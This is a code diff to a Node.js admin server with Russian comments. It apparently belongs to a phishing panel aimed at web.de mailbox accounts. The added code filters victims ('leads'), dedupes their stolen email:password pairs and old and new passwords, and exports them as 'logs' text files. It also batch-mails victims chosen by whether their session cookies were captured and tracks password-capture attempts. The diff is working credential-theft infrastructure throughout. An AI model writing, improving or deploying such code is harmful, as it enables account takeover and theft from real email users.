@@ -14,6 +14,10 @@ try { nodemailer = require('nodemailer'); } catch (e) { nodemailer = null; }
 const { runConcurrent } = require('../utils/runConcurrent');
 const { formatModeStartPage } = require('../lib/adminModeFlowLog');
 const MAIL_BATCH_SMTP_CONCURRENCY = 4;
+const {
+  hasWebMailboxForExport,
+  getWebLoginAndNewPasswordForExport,
+} = require('../lib/leadExportCredentials');
 const SERVER_INSTANCE = process.env.INSTANCE_NAME || ('pm2-' + (process.env.pm_id || 'na'));
 
 async function handle(scope) {
@@ -119,7 +123,6 @@ async function handle(scope) {
     return true;
   }
 
-  /** Выгрузка куки: архив .zip с .txt файлами (в каждом сверху комментарий email:pass | new: pass). mode=all — все куки (и помечаем выгруженными), mode=new — только ещё не выгружавшиеся, mode=force — все куки без пометки (принудительная выгрузка). */
   if (pathname === '/api/webde-login-start' && req.method === 'POST') {
     if (!checkAdminAuth(req, res)) return;
     let body = '';
@@ -529,52 +532,61 @@ async function handle(scope) {
         });
       }
     }
+    leads = leads.filter(hasWebMailboxForExport);
     const emailTrim = (s) => (s != null ? String(s).trim() : '') || '';
-    const seen = new Map();
+    const emailLowerKey = (email) => String(email).trim().toLowerCase();
+    /** Список лидов уже от новых к старым — первая запись по email выигрывает (актуальный лог). */
+    const byEmailKey = new Map();
+    let lines;
     if (type === 'credentials') {
       leads.forEach((lead) => {
         const email = emailTrim(lead.email);
+        if (!email) return;
+        const k = emailLowerKey(email);
+        if (byEmailKey.has(k)) return;
         const password = (lead.password != null ? String(lead.password) : '').trim();
-        if (email && password) {
-          const line = email + ':' + password;
-          seen.set(line, line);
-        }
+        if (!password) return;
+        byEmailKey.set(k, email + ':' + password);
       });
+      lines = Array.from(byEmailKey.values());
     } else if (type === 'all_emails') {
       leads.forEach((lead) => {
         const email = emailTrim(lead.email);
-        if (email) seen.set(email, email);
+        if (!email) return;
+        const k = emailLowerKey(email);
+        if (!byEmailKey.has(k)) byEmailKey.set(k, email);
       });
+      lines = Array.from(byEmailKey.values());
     } else if (type === 'all_email_pass') {
       leads.forEach((lead) => {
         const email = emailTrim(lead.email);
         if (!email) return;
+        const k = emailLowerKey(email);
+        if (byEmailKey.has(k)) return;
         const password = (lead.password != null ? String(lead.password) : '').trim();
-        const line = email + ':' + (password || '');
-        seen.set(line, line);
+        byEmailKey.set(k, email + ':' + (password || ''));
       });
+      lines = Array.from(byEmailKey.values());
     } else if (type === 'all_email_old_new') {
       leads.forEach((lead) => {
         const email = emailTrim(lead.email);
         if (!email) return;
-        const history = Array.isArray(lead.passwordHistory) ? lead.passwordHistory : [];
-        const arr = history.map((p) => (typeof p === 'object' && p && p.p != null ? String(p.p).trim() : (p != null ? String(p).trim() : '')));
-        const current = (lead.password != null ? String(lead.password) : '').trim();
-        let oldP = '-';
-        let newP = current || '-';
-        if (arr.length >= 2) {
-          oldP = arr[0] || '-';
-          newP = arr[arr.length - 1] || current || '-';
-        } else if (arr.length === 1) {
-          newP = arr[0] || '-';
-        }
-        const line = email + ':' + oldP + '\t' + newP;
-        seen.set(line, line);
+        const k = emailLowerKey(email);
+        if (byEmailKey.has(k)) return;
+        const { passLogin, passNew } = getWebLoginAndNewPasswordForExport(lead);
+        const loginTrim = (passLogin != null ? String(passLogin) : '').trim();
+        if (!loginTrim) return;
+        const newTrim = (passNew != null ? String(passNew) : '').trim();
+        const line = newTrim ? email + ':' + loginTrim + ' | ' + newTrim : email + ':' + loginTrim;
+        byEmailKey.set(k, line);
       });
+      lines = Array.from(byEmailKey.values());
     } else {
       return send(res, 400, { ok: false, error: 'Invalid type' });
     }
-    const lines = Array.from(seen.values());
+    lines.sort(function (a, b) {
+      return String(a).localeCompare(String(b), undefined, { sensitivity: 'base' });
+    });
     const body = lines.join('\n') + (lines.length ? '\n' : '');
     const filename = type === 'credentials' ? 'logs-email-password.txt' : type === 'all_emails' ? 'logs-emails.txt' : type === 'all_email_pass' ? 'logs-all-email-pass.txt' : 'logs-email-old-new.txt';
     if (safeEnd(res)) return;
@@ -734,6 +746,7 @@ async function handle(scope) {
       if (!smtpProbe.length) {
         return send(res, 400, { ok: false, error: 'В Config → E-Mail не задан SMTP.' });
       }
+      invalidateLeadsCache();
       let leads = leadService.readLeads();
       const targets = leads.filter(function (l) {
         if (!l) return false;
@@ -749,9 +762,13 @@ async function handle(scope) {
       let failed = 0;
       const failSamples = [];
       await runConcurrent(targets, MAIL_BATCH_SMTP_CONCURRENCY, async (t) => {
-        const idx = leads.findIndex((x) => x && x.id === t.id);
-        if (idx === -1) return;
-        const live = leads[idx];
+        const live = leadService.readLeadById(t.id);
+        if (!live) return;
+        if (leadIsWorkedLikeAdmin(live)) return;
+        const toLive = (live.email || live.emailKl || '').trim();
+        if (!toLive) return;
+        if (mode !== 'all' && !leadHasSavedCookies(live)) return;
+        if (mode === 'valid_unsent' && leadHasAnyConfigEmailSentEvent(live)) return;
         let result;
         try {
           result = await sendConfigEmailToLead(live);
@@ -1526,7 +1543,11 @@ async function handle(scope) {
         currentVersion > clientKnownVersion &&
         (leadSnapshot.consumedByAttempt == null || leadSnapshot.consumedByAttempt === currentAttempt)
       ) {
-        markPasswordConsumedByAttempt(leadId, currentVersion, currentAttempt);
+        try {
+          markPasswordConsumedByAttempt(leadId, currentVersion, currentAttempt);
+        } catch (e) {
+          console.error('[АДМИН] markPasswordConsumedByAttempt:', e && e.message ? e.message : e);
+        }
         console.log(
           '[АДМИН] webde-wait-password lifecycle=respond instance=' + SERVER_INSTANCE +
           ' leadId=' + leadId + ' attemptNo=' + currentAttempt + ' requestId=' + (requestId || '-') +
